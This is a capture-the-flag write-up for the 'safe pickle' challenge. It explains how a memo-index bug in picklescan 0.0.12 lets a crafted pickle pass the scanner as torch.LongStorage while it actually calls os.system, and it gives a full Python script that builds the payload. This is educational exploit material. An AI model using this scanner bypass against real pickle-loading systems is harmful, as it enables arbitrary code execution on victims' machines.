# safe pickle

## challenge

```dockerfile
FROM python:3.11-alpine AS app

RUN pip install picklescan==0.0.12

FROM pwn.red/jail
COPY --from=app / /srv
COPY ./server.py /srv/app/run
ENV JAIL_MEM=32M
```

```py
#!/usr/bin/env python3
from picklescan.scanner import scan_pickle_bytes, SafetyLevel
import io, pickle, base64

inp = input("Base64 encoded pickle: ")
pkl = base64.b64decode(inp)
result = scan_pickle_bytes(io.BytesIO(pkl), 1337)
if (
    result.scan_err
    or result.issues_count > 0
    or not all([g.safety == SafetyLevel.Innocuous for g in result.globals])
):
    print("Dangerous pickle!")
    exit()

pickle.loads(pkl)
```

## solution

(writeup mostly taken from maple3142, see his github repo with challs)

The [way](https://github.com/mmaitre314/picklescan/blob/40001cd1caa9e041b1bce1b80f3707056cd8be52/src/picklescan/scanner.py#L193) picklescan handles memo doesn't look at the argument, so it is possible to have a different memo and use `STACK_GLOBAL` to bypass allowlist checking.

It uses len(memo) even when the opcode is `PUT`. If we use `PUT` with argument `1` and there are 0 things in the memo, the real unpickler will have the top object in `1` but this fake simulated unpickler/pickle validator will have it at `0`. We can make it think we are importing something that is ok when it is not ok.

```python
import pickle, base64

pkl = b''.join([
    pickle.UNICODE + b'os\n',
    pickle.PUT + b'2\n',  # {2: "os"} for real, {0: "os"} for picklescan
    pickle.POP,
    pickle.UNICODE + b'system\n',
    pickle.PUT + b'3\n',  # {2: "os", 3: "system"} for real, {0: "os", 1: "system"} for picklescan
    pickle.POP,
    pickle.UNICODE + b'torch\n',
    pickle.PUT + b'0\n',  # {2: "os", 3: "system", 0: "torch"} for real, {0: "os", 1: "system", 2: "torch"} for picklescan
    pickle.POP,
    pickle.UNICODE + b'LongStorage\n',
    pickle.PUT + b'1\n',  # {2: "os", 3: "system", 0: "torch", 1: "LongStorage"} for real, {0: "os", 1: "system", 2: "torch", 3: "LongStorage"} for picklescan
    pickle.POP,

    pickle.GET + b'2\n',
    pickle.GET + b'3\n',
    pickle.STACK_GLOBAL,  # we will end up getting os.system on real but picklescan will think we are getting torch.LongStorage

    pickle.MARK,
    pickle.UNICODE + b'cat flag.txt\n',
    pickle.TUPLE,

    pickle.REDUCE
]) + b'.'
print(base64.b64encode(pkl).decode())
```
